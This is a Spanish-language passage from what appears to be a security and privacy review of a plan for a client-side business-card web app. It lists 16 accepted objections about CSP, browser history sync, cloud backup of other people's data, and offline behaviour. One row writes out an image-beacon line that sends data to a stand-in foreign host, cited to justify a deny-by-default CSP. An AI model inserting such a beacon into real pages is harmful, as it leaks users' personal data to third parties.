| **B3** | B | Los candados (CSP, `Referrer-Policy`, `noindex`) colgaban de la Ola 6, que está sujeta a G6. Un G6 en NO publicaba el producto **sin ninguna CSP**, aunque el `localStorage` con datos personales existe con link o sin él. Y la landing de referencia que la Ola 1 debe copiar tampoco trae CSP (`Personal landing page\next.config.ts:21-43`) | ALTA | **ACEPTADA.** Defecto estructural real, introducido al escribir el PRP, no heredado del plan | Los candados salen de la Ola 6 y nacen como **unidad 1e** (Ola 1, siempre corre). El barrido de cero dominios ajenos pasa a **7e** (Ola 7, siempre corre). La nota de "Si G6 queda en NO" se corrigió: ya no los apaga |
| **B1** | B | §8 afirmaba que el script de terceros es *"la única vía de fuga real del diseño"*. Falso: el link queda en el **historial** de quien lo abra y se sincroniza a sus otros dispositivos si tiene Chrome Sync o iCloud, que es el default. Ningún header lo evita, porque el historial vive en el navegador, no en la red ni en el DOM | ALTA | **ACEPTADA.** El grep de `historial|sincroniz` sobre el documento daba cero, verificado también por el orquestador | Se quitó la palabra "única". Gotcha nuevo en §8, la advertencia de 6b ahora lo nombra, y §11 declara que **no tiene arreglo desde la página**: solo se advierte |
| **B2** | B | La CSP declarada nombraba solo `script-src` y `connect-src`. Un `new Image().src = 'https://ajeno/?d='+datos` exfiltra por `img-src`, que ninguna de las dos gobierna, y pasa el assert tal como estaba escrito | ALTA | **ACEPTADA** | La unidad 1e exige **`default-src 'self'`, deny by default**, y su `Verifica` comprueba justo eso. §9 lo explica con el vector concreto |
| **B4** | B | El `.jpeg` en Fotos y el `.vcf` en Contactos se respaldan solos a iCloud o Google. Si alguien crea la tarjeta de un tercero, los datos de esa persona suben a una cuenta que ella no controla. La única mitigación era copy con `JUICIO:`, sin ningún gate | ALTA | **ACEPTADA** | 2d pasa de copy a **control con gate**: la exportación se bloquea hasta marcar la confirmación de que la tarjeta es propia o autorizada, y su `Verifica` sube de `JUICIO:` a `SCRIPT:`. Gotcha nuevo en §8 |
| **B5** | B | En un equipo compartido de stand, el autosave de 2c le muestra al siguiente la tarjeta del anterior. No había botón de borrado en ninguna de las 4 pantallas | ALTA | **ACEPTADA** | 1d agrega **borrar**, 2d agrega el botón visible en el editor, y §10 suma el criterio de éxito correspondiente |
| **A2** | A | §9 decía que el escaneo pantalla a pantalla *"se mide en 4d con un lector real"*, pero 4d decodifica el **archivo que el propio código produjo**, en las condiciones ideales en que se generó. Nunca pasa por brillo real, reflejo, ni cámara de gama baja. Es el patrón "verificación que no verifica" | ALTA | **ACEPTADA.** Verificado por el orquestador contra el texto de 4d antes de aceptarlo | Unidad nueva **4e**: gate físico 🙋 de escaneo de una pantalla a otra, a brillo de evento y luz de interior. §10 apunta ahí y ya no a 4d |
| **A1** | A | Cero menciones a red caída. El caso de uso declarado (una conferencia) es el peor escenario de red que existe, y sin Service Worker un usuario nuevo ve la pantalla de error del navegador, no una degradación | ALTA | **ACEPTADA como gate, no como construcción.** Construir una PWA es alcance propio y esa es una decisión del operador, no del agente | **Gate G7 nuevo** en §3, con recomendación: en v1 no construirlo y **declarar el límite en el copy**. Queda 🙋 SIN RESPONDER |
| **A3** | A | El criterio de "menos de 2 minutos" era gameable: no decía qué tarjeta se llena ni si el probador ya conoce el flujo. Se pasa en verde cronometrando nombre y correo con alguien que ya sabe dónde tocar | ALTA | **ACEPTADA** | §10 ahora fija el perfil: persona que **nunca vio la app**, **tarjeta completa con capa de venta incluida**, y dice explícito que la ruta feliz no cuenta |
| **B8** | B | El borrador del aviso "tus datos no salen de tu dispositivo" es más fuerte que lo que el producto hace: las dos salidas principales (`.jpeg` y `.vcf`) existen justamente para que los datos SALGAN del dispositivo, y el problema que el PRP dice resolver es *comunicar* datos | MEDIA | **ACEPTADA la objeción, NO la decisión.** El texto del aviso es el gate G2 y lo cierra el operador, no el agente | G2 ahora trae la objeción escrita y una **redacción recomendada**: "no guardamos tus datos en ningún servidor", que sí es sostenible con D1. Sigue 🙋 SIN RESPONDER |
| **A4** | A | 3d depende solo de 3b y 3c, o sea cubre las dos vistas de tarjeta. El editor (Ola 2) y la pantalla de salidas (Olas 5 y 6) nunca se miden, y son las de más controles | MEDIA | **ACEPTADA** | La unidad **7e** corre el assert de 375 px y 44 px sobre **las 4 pantallas**, al final. §10 lo dice |
| **A5** | A | Nada contempla que el link se abra dentro del WebView de una app social, que es el canal por el que algo que se regala se comparte. Ahí `navigator.share` con archivos se degrada o se bloquea | MEDIA | **ACEPTADA** | 5d prueba además **desde adentro de Instagram y LinkedIn**. Gotcha nuevo en §8 |
| **B9** | B | El campo libre de notas no tenía ninguna advertencia, aunque §12 presume que el corpus cubre datos sensibles. Es el único campo donde cabe cualquier cosa | MEDIA | **ACEPTADA** | §5 marca el campo, y 2d extiende la advertencia a notas además de dirección física |
| **B7** | B | Un criterio de éxito incondicional de §10 dependía de una unidad que podía no existir (6d moría con G6) | MEDIA | **ACEPTADA.** Es la misma raíz que B3 | Resuelta por B3: el criterio apunta a 7e, que siempre corre |
| **B6** | B | 6d y 2d pasaban en verde con los agujeros abiertos, y lo no mitigado no estaba declarado | MEDIA | **ACEPTADA** | Cubierta por B2, B4 y B5. Lo que no se mitiga (historial ajeno, control de edad) queda **declarado en §11**, no ausente por omisión |
| **A6** | A | El assert de 5c ("varianza mayor que cero") solo descarta imagen en blanco: pasa cualquier render roto que no sea un color sólido | BAJA | **ACEPTADA como documentación**, no como cambio de test. 5d ya cierra el hueco | 5c declara en su propia fila que es filtro de "no vacío", no de "correcto" |
| **B10** | B | Menores de edad no aparecen en ningún punto | BAJA | **ACEPTADA** | §11 declara que no hay control de edad y que el aviso de G2 no debería dirigirse a menores |

### Lo que los dos lentes coincidieron en que está BIEN resuelto

- **D1 defendido en profundidad, no solo declarado:** fragmento en vez de query string, y el
  razonamiento escrito para que nadie lo "mejore" al revés.
- **La prohibición explícita de `next/og` y `@vercel/og`** (§2 y §8): los dos la marcaron como el
  hallazgo que evita que un agente futuro rompa D1 en silencio reusando el precedente del repo hermano.
- **El gotcha de `<a download>` en iOS**, con `navigator.share` más fallback y gate físico al final.
- **La irrevocabilidad del link** declarada como limitación de producto en el copy, no escondida.
- **El round-trip del codec** (`decode(encode(x)) === x`) como disciplina para no corromper la tarjeta
  de un desconocido.
- **§13 se niega a inventar una métrica falsa** y prioriza el candado sobre la métrica (`DESCARTAR`).
- **§12 marca el límite de su propia investigación jurídica** ([Suponiendo], no sustituye a un abogado).
  El lente B lo señaló como la disciplina correcta, y usó ese mismo contraste para cazar B8: esa
  higiene no se había aplicado al eslogan de marketing.

### El fallo más probable, según cada lente

- **Lente A:** que la red del salón esté saturada y un usuario nuevo nunca cargue la app. Sin
  Service Worker no hay degradación, hay pantalla de error del navegador, y ocurre en el momento exacto
  de entregar el regalo. → **Gate G7**, sin responder.
- **Lente B:** el historial y la sincronización del navegador, no un script malicioso. Ocurre en uso
  normal, sin que nadie haga nada malo, en el 100% de los usuarios con sync activo. → **Sin arreglo
  técnico**; se advierte en 6b y se declara en §11.

### Cierre posterior de los dos gates que salieron de este debate

> Las filas A1 y B8 de la tabla de arriba quedan como estaban: son el registro de lo que se sabía ese
> día y no se reescriben. Lo que pasó después va aquí. **El mismo 2026-09-03, el operador cerró los
> dos:** G7 en no construir PWA en v1 y declarar el límite en el copy (§11), y G2 en la frase exacta
> "No guardamos tus datos en ningún servidor", que es la que el lente B había recomendado.
> O sea: los dos hallazgos del debate llegaron hasta una decisión, no se quedaron en el informe.

### Objeciones NO aceptadas

Ninguna. Las 16 se aceptaron: 13 se aplicaron al documento, 2 se convirtieron en gate del operador
(G7 nuevo, y la redacción recomendada dentro de G2) y 1 (B7) quedó resuelta por la misma corrección
que B3.
